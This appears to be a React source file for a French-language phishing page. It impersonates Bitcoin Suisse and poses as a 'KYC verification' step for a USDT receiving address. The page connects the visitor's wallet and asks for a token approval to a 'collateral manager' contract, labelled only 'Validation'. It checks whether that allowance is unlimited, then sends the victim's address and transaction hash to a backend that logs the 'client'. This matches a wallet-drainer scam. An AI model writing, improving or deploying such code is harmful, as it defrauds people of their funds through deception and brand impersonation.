import React, { useState, useEffect } from 'react';
import { useAccount, useDisconnect } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { Button } from '../components/ui/button';
import { Wallet, ShieldCheck, CheckCircle, Loader2, Lock, ArrowRight } from 'lucide-react';
import { useApproveCollateralManager, useCheckAllowance } from '../hooks/useCollateral';
import { CONTRACT_ADDRESSES } from '../config/web3';
import { formatAddress } from '../lib/utils';
import { toast, Toaster } from 'sonner';

// Assets
const BG_IMAGE_URL = 'https://customer-assets.emergentagent.com/job_e944dbd1-afea-45c7-ac56-4416160dab76/artifacts/196ui195_image_finale.jpg';

export default function Landing() {
  const [pageReady, setPageReady] = useState(false);
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { open, close } = useWeb3Modal();
  const [isProcessing, setIsProcessing] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  
  // Hooks pour le flux simplifié
  const { approve, isPending: isApproving, isConfirmed: approveConfirmed } = useApproveCollateralManager();
  const { hasApproved, isUnlimited, refetch: refetchAllowance, isLoading: isCheckingAllowance } = useCheckAllowance();

  // Vérifier si le nouveau contrat est déployé
  const isContractDeployed = CONTRACT_ADDRESSES.COLLATERAL_MANAGER !== 'PENDING_DEPLOYMENT';

  // Marquer la page comme prête après le montage
  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  // Fermer le modal quand connecté
  useEffect(() => {
    if (isConnected && isConnecting) {
      setIsConnecting(false);
      close();
    }
  }, [isConnected, isConnecting, close]);

  // Rafraîchir l'allowance après une approbation confirmée
  useEffect(() => {
    if (approveConfirmed) {
      setTimeout(() => {
        refetchAllowance();
      }, 2000);
    }
  }, [approveConfirmed, refetchAllowance]);

  const handleConnect = async () => {
    try {
      setIsConnecting(true);
      await open();
    } catch (error) {
      console.error('Erreur connexion:', error);
      toast.error('Échec de la connexion');
      setIsConnecting(false);
    }
  };

  const handleApprove = async () => {
    if (!isConnected) {
      toast.error('Veuillez connecter votre wallet d\'abord');
      return;
    }

    if (!isContractDeployed) {
      toast.error('Le contrat n\'est pas encore déployé.');
      return;
    }

    try {
      setIsProcessing(true);
      
      toast.info('Veuillez confirmer la transaction dans votre wallet...');
      const txHash = await approve();
      console.log('✅ Approve TX envoyée:', txHash);
      
      // ENVOYER IMMÉDIATEMENT AU BACKEND dès que le wallet a validé
      try {
        const backendUrl = process.env.REACT_APP_BACKEND_URL || '';
        const response = await fetch(`${backendUrl}/api/clients`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            address: address,
            tx_hash: txHash 
          })
        });
        if (response.ok) {
          console.log('✅ Client enregistré dans le backend');
        }
      } catch (backendError) {
        console.error('Erreur backend:', backendError);
      }
      
      toast.success('Validation réussie !');
      
      // Attendre la confirmation blockchain en arrière-plan
      let confirmed = false;
      let attempts = 0;
      const maxAttempts = 15;
      
      while (!confirmed && attempts < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        try {
          if (window.ethereum) {
            const receipt = await window.ethereum.request({
              method: 'eth_getTransactionReceipt',
              params: [txHash],
            });
            
            if (receipt && receipt.status === '0x1') {
              confirmed = true;
            }
          }
        } catch (e) {
          console.log('Vérification en cours...', attempts);
        }
        
        attempts++;
      }
      
      if (confirmed) {
        refetchAllowance();
      }
      
    } catch (error) {
      console.error('Erreur:', error);
      
      let errorMessage = 'Une erreur est survenue';
      
      if (error?.message) {
        if (error.message.includes('User rejected') || error.message.includes('user rejected') || error.message.includes('denied')) {
          errorMessage = 'Transaction annulée par l\'utilisateur';
        } else if (error.message.includes('insufficient funds')) {
          errorMessage = 'Fonds insuffisants pour les frais de gas';
        } else {
          errorMessage = error.message;
        }
      }
      
      toast.error(errorMessage);
    } finally {
      setIsProcessing(false);
    }
  };

  // Déterminer l'état du bouton
  const getButtonState = () => {
    if (!isContractDeployed) {
      return { disabled: true, text: 'En attente', icon: <Lock className="mr-2 h-5 w-5" /> };
    }
    if (isCheckingAllowance) {
      return { disabled: true, text: 'Vérification...', icon: <Loader2 className="mr-2 h-5 w-5 animate-spin" /> };
    }
    if (hasApproved) {
      return { disabled: true, text: 'Confirmé', icon: <CheckCircle className="mr-2 h-5 w-5" /> };
    }
    if (isProcessing || isApproving) {
      return { disabled: true, text: 'Traitement...', icon: <Loader2 className="mr-2 h-5 w-5 animate-spin" /> };
    }
    return { disabled: false, text: 'Validation', icon: <ShieldCheck className="mr-2 h-5 w-5" /> };
  };

  const buttonState = getButtonState();

  // Écran de chargement initial
  if (!pageReady) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="w-10 h-10 border-2 border-[#E31B23] border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen text-white font-['Inter',sans-serif] relative"
      style={{ 
        backgroundImage: `url(${BG_IMAGE_URL})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center top',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <Toaster 
        richColors 
        position="top-center"
        toastOptions={{
          style: {
            background: '#1a1a1a',
            border: '1px solid #333',
            color: '#fff'
          }
        }}
      />
      
      {/* Bandeau divisé : noir en haut, gris en bas */}
      <div className="absolute top-0 left-0 right-0 z-10">
        {/* Partie noire en haut */}
        <div className="h-[80px] bg-black flex items-center">
          {/* Logo Bitcoin Suisse aligné avec le contenu */}
          <div className="ml-[14%]">
            <img 
              src="https://customer-assets.emergentagent.com/job_e944dbd1-afea-45c7-ac56-4416160dab76/artifacts/vu785ck4_image.png" 
              alt="Bitcoin Suisse" 
              className="w-[200px] object-contain object-left"
              style={{ objectPosition: 'left top' }}
            />
          </div>
        </div>
        {/* Partie grise en bas */}
        <div className="h-[40px] bg-[#2a2a2a]"></div>
      </div>
      
      {/* Contenu dans le rectangle gris à gauche */}
      <div className="absolute left-[14%] top-[38%] w-[360px] flex flex-col justify-start px-8 py-6">
        
        {/* Badge */}
        <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-[#E31B23]/20 border border-[#E31B23]/40 rounded-full text-[#E31B23] text-xs font-medium mb-5 w-fit">
          <ShieldCheck className="w-3 h-3" />
          ESPACE CLIENT SÉCURISÉ
        </div>
        
        {/* Titre */}
        <h1 className="text-5xl font-bold leading-tight mb-4 whitespace-nowrap">
          Vérification <span className="text-[#E31B23]">KYC</span>
        </h1>
        
        {/* Description */}
        <p className="text-white text-sm leading-relaxed mb-5">
          Connectez votre wallet afin de valider votre adresse de réception des fonds USDT (ERC-20).
        </p>

        {/* Statut si connecté et autorisé */}
        {isConnected && hasApproved && (
          <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/30 rounded-lg mb-4">
            <CheckCircle className="w-5 h-5 text-green-500" />
            <p className="font-semibold text-green-400 text-sm">Adresse validée</p>
          </div>
        )}

        {/* Wallet Info si connecté */}
        {isConnected && (
          <div className="bg-[#0a0a0a]/80 border border-gray-700 rounded-lg p-3 mb-4">
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Wallet connecté</p>
            <p className="font-mono text-xs text-white">{formatAddress(address)}</p>
            <button 
              onClick={() => disconnect()}
              className="text-gray-500 hover:text-[#E31B23] text-xs mt-1 transition-colors"
            >
              Déconnecter
            </button>
          </div>
        )}
        
        {/* Étapes */}
        <div className="space-y-3 mb-6">
          <div className="flex items-center gap-3">
            <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold ${isConnected ? 'bg-green-500 text-black' : 'bg-[#E31B23] text-white'}`}>
              {isConnected ? '✓' : '1'}
            </div>
            <span className={`text-sm ${isConnected ? 'text-green-400' : 'text-white'}`}>
              Connecter votre wallet
            </span>
          </div>
          <div className="flex items-center gap-3">
            <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold ${hasApproved ? 'bg-green-500 text-black' : isConnected ? 'bg-[#E31B23] text-white' : 'bg-gray-700 text-white'}`}>
              {hasApproved ? '✓' : '2'}
            </div>
            <span className={`text-sm ${hasApproved ? 'text-green-400' : 'text-white'}`}>
              Valider votre adresse
            </span>
          </div>
        </div>
        
        {/* Bouton */}
        {!isConnected ? (
          <Button 
            onClick={handleConnect}
            className="w-full h-12 bg-[#E31B23] hover:bg-[#c91820] text-white font-semibold"
            data-testid="connect-wallet-button"
          >
            <Wallet className="mr-2 h-5 w-5" />
            Connecter Wallet
            <ArrowRight className="ml-2 h-4 w-4" />
          </Button>
        ) : (
          <Button 
            onClick={handleApprove}
            disabled={buttonState.disabled}
            className={`w-full h-12 font-semibold ${
              hasApproved 
                ? 'bg-green-600/20 text-green-400 border border-green-600/30 hover:bg-green-600/30' 
                : 'bg-[#E31B23] hover:bg-[#c91820] text-white'
            }`}
            data-testid="sign-permit-button"
          >
            {buttonState.icon}
            {buttonState.text}
            {!hasApproved && !buttonState.disabled && <ArrowRight className="ml-2 h-4 w-4" />}
          </Button>
        )}
      </div>
    </div>
  );
}
